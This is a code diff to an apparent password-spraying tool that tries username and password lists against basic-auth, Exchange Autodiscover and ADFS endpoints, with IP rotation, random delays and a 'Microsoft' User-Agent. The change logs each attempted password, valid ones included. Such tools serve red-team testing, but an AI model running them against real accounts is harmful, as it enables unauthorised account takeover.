@@ -98,11 +98,11 @@ def basicauth_attempts(users, passes, targets, sleep_time, random, min_sleep, ma
                     response = session.get(target)
                     #  Currently checking only if working or not, need to add more tests in the future
                     if response.status_code == 200:
-                        log_event(subject=username, target=target, status="success", ip=ip, details="")
+                        log_event(subject=username, password=password, target=target, status="success", ip=ip, details="")
                         working_creds_counter += 1
                         LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
                     else:
-                        log_event(subject=username, target=target, status="fail", ip=ip, details="")
+                        log_event(subject=username, password=password, target=target, status="fail", ip=ip, details="")
                         LOGGER.debug("[-]Creds failed for: %s" % username)
                     if random is True:  # let's wait between attempts
                         sleep_time = random_time(min_sleep, max_sleep)
@@ -139,11 +139,11 @@ def autodiscover_attempts(users, passes, targets, sleep_time, random, min_sleep,
                                        headers={'User-Agent': 'Microsoft'}, verify=False)
                     #  Currently checking only if working or not, need to add more tests in the future
                     if req.status_code == 200:
-                        log_event(subject=username, target=target, status="success",  ip=ip, details="")
+                        log_event(subject=username, password=password, target=target, status="success",  ip=ip, details="")
                         working_creds_counter += 1
                         LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
                     else:
-                        log_event(subject=username, target=target, status="fail", ip=ip, details="")
+                        log_event(subject=username, password=password, target=target, status="fail", ip=ip, details="")
                         LOGGER.debug("[-]Creds failed for: %s" % username)
                     if random is True:  # let's wait between attempts
                         sleep_time = random_time(min_sleep, max_sleep)
@@ -203,11 +203,11 @@ def adfs_attempts(users, passes, targets, sleep_time, random, min_sleep, max_sle
                     #  Currently checking only if working or not, need to add more tests in the future
 
                     if status_code == 302:
-                        log_event(subject=username, target=target, status="success", ip=ip, details="")
+                        log_event(subject=username, password=password, target=target, status="success", ip=ip, details="")
                         working_creds_counter += 1
                         LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
                     else:
-                        log_event(subject=username, target=target, status="fail", ip=ip, details="")
+                        log_event(subject=username, password=password, target=target, status="fail", ip=ip, details="")
                         LOGGER.debug("[-]Creds failed for: %s" % username)
                     if random is True:  # let's wait between attempts
                         sleep_time = random_time(min_sleep, max_sleep)
